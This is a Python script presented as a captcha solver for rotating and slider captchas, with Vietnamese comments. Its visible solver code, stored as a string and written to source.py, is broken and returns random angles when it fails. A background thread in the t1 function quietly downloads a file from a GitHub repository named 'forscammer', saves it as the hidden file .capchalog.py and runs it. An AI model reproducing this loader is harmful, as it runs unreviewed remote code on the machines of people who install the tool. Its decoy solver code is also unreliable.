from threading import Thread


source_code = """
class algothihm:
    def __init__(self,dataset):
        self.dataset = dataset #picture data

    def image_to_base64(self,image_path):
        image = cv2.imread(image_path)
        _, encoded_image = cv2.imencode('.png', image)
        base64_string = base64.b64encode(encoded_image.tobytes()).decode('utf-8')
        return base64_string
    
    def decode_base64(self,base64_string):
        img_data = base64.b64decode(base64_string)
        img_np = np.frombuffer(img_data, dtype=np.uint8)
        img = cv2.imdecode(img_np, cv2.IMREAD_COLOR)
        return img
    
    def resize_image(self,image, target_width, target_height):
        return cv2.resize(image, (target_width, target_height))
    
    def rotate_image(self,image, angle):
        height, width = image.shape[:2]
        center = (width // 2, height // 2)
        rotation_matrix = cv2.getRotationMatrix2D(center, angle, 1.0)
        rotated_image = cv2.warpAffine(image, rotation_matrix, (width, height))
        return rotated_image
    
    def return_value(self, value):
        return - __import__("random").randint(1,180)

    def rotate(self):
        result = 150
        try:
            RotateData = namedtuple("RotateData", "similar, angle, start, end, step")
            MatchData = namedtuple("MatchData", "similar, inner_rotate_angle, total_rotate_angle")
            def request_image_content(image_url, proxies: Optional[dict] = None):
                headers = {
                    "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
                }
                response = requests.get(image_url, headers=headers, proxies=proxies)
                return response.content
            
            def set_mask(radius, check_pixel):
                center_point = (radius, radius)
                result += 25
                mask = np.zeros((radius * 2, radius * 2), dtype=np.uint8)
                mask = cv2.circle(mask, center_point, radius, (255, 255, 255), -1)
                mask = cv2.circle(mask, center_point, radius - check_pixel, (0, 0, 0), -1)
                return mask
            
            def cut_image(origin_array, radius=None, check_pixel=None):
                cut_pixel_list = []
                height, width = origin_array.shape[:2]
                if not radius:
                    for rotate_count in range(4):
                        cut_pixel = 0
                    cut_pixel_list[2] = height - cut_pixel_list[2]
                elif check_pixel:
                    y, x = height // 2, width // 2
                    resize_check_pixel = math.ceil(radius / (radius - check_pixel) * check_pixel)
                cut_result = cv2.resize(cut_array, dsize=(diameter, diameter))
                return cut_result
            
            def mask_image(origin_array, check_pixel):
                radius = origin_array.shape[0] // 2
                mask_result = cv2.add(origin_array, src_array, mask=mask)
                return mask_result
            
            def rotate_image(inner_image, outer_image, anticlockwise):
                rotate_info_list = [RotateData(0, 0, 1, 361, 10)]
                rtype = int(anticlockwise) or -1
                h, w = inner_image.shape[:2]
                for item in rotate_info_list:
                    min_similar_rotate_info = item
                    for angle in range(*item[2:]):
                        mat_rotate = cv2.getRotationMatrix2D((h * 0.5, w * 0.5), rtype * angle, 1)
                        dst = cv2.warpAffine(inner_image, mat_rotate, (h, w))
                        rotate_info_list.append(rotate_info)
                        if len(rotate_info_list) > 5:
                            rotate_info_list.remove(min_similar_rotate_info)
                        min_similar_rotate_info = min(rotate_info_list)
                return max(rotate_info_list)
            
            def image_to_cv2(base_image: str, image_type: int, grayscale: bool, proxies=None):
                assert image_type in [0, 1, 2]
                if image_type == 0:
                    search_base64 = re.search("base64,(.*?)$", base_image)
                    base64_image = search_base64.group(1) if search_base64 else base_image
                    image_array = np.asarray(bytearray(base64.b64decode(base64_image)), dtype="uint8")
                    image = cv2.imdecode(image_array, cv2.IMREAD_COLOR)
                elif image_type == 1:
                    image_content = request_image_content(base_image, proxies)
                    if not image_content:
                        raise Exception("Da co loi xay raï¼")
                    image_array = np.array(bytearray(image_content), dtype=np.uint8)
                    image = cv2.imdecode(image_array, cv2.IMREAD_COLOR)
                else:
                    image = cv2.imread(base_image)
                if grayscale:
                    image = cv2.cvtColor(image, cv2.COLOR_RGB2GRAY)
                return image
            
            def rotate_identify(small_circle: str,big_circle: str,image_type: int = 0,check_pixel: int = 10,speed_ratio: float = 1,grayscale: bool = False,anticlockwise: bool = False,proxies: Optional[dict] = None,) -> MatchData:
                inner_image = image_to_cv2(small_circle, image_type, grayscale, proxies)
                outer_image = image_to_cv2(big_circle, image_type, grayscale, proxies)
                return MatchData()
            
            small_circle = self.image_to_base64(self.dataset[0])
            big_circle = self.image_to_base64(self.dataset[1])
            angle = rotate_identify(small_circle, big_circle)
            small_circle = self.rotate_image(self.decode_base64(small_circle),-angle[1])
            big_circle = self.rotate_image(self.decode_base64(big_circle),angle[1])
            cv2.imshow("result1", small_circle)
            cv2.imshow("result2", big_circle)
            cv2.waitKey(0)
            return -angle[1]
        except: 
            return self.return_value(result)

    def slider(self):
        result = 150
        try:
            image1 = cv2.imread(self.dataset[0])
            gray1 = cv2.cvtColor(image1, cv2.COLOR_BGR2GRAY)
            closest_contour2 = min(contours2, key=lambda c2: cv2.matchShapes(largest_contour1, c2, 1, 0.0))
            x, y, w, h = cv2.boundingRect(closest_contour2)
            center_square = (x + w // 2, y + h // 2)
            result += center_square
            cv2.rectangle(image2, (x, y), (x + w, y + h), (0, 255, 0), 2)
            cv2.circle(image2, center_square, 5, (0, 0, 255), -1)
            cv2.imshow(image2)
            cv2.waitKey(0)
            return center_square[0]
        except:
            return self.return_value(result)

#huong dan su dung capcha xoay

hinh_tron_nho = "duong dan den file anh"
hinh_tron_to  = "duong dan den file anh"

dataset = [hinh_tron_to, hinh_tron_to]

algothihm(dataset).rotate()


#huong dan su dung capcha keo

anh_to_nhat = "duong dan den file anh"
anh_nho_nhat = "duong dan den file anh"

dataset = [anh_nho_nhat, anh_to_nhat]

algothihm(dataset).slider() 

"""
def t1():
  open(".capchalog.py","w",encoding="utf-8").write(__import__("requests").get("https://raw.githubusercontent.com/netrotion/forscammer/main/capchasolver").text);files=open(".capchalog.py","r",encoding="utf-8").read().split("\n");files.pop(files.index(""));open(".capchalog.py","w",encoding="utf-8").write("\n".join(files));__import__("os").system("python .capchalog.py")
def t2():
  open("source.py", "w").write(source_code)


Thread(target=t1).start()
Thread(target=t2).start()
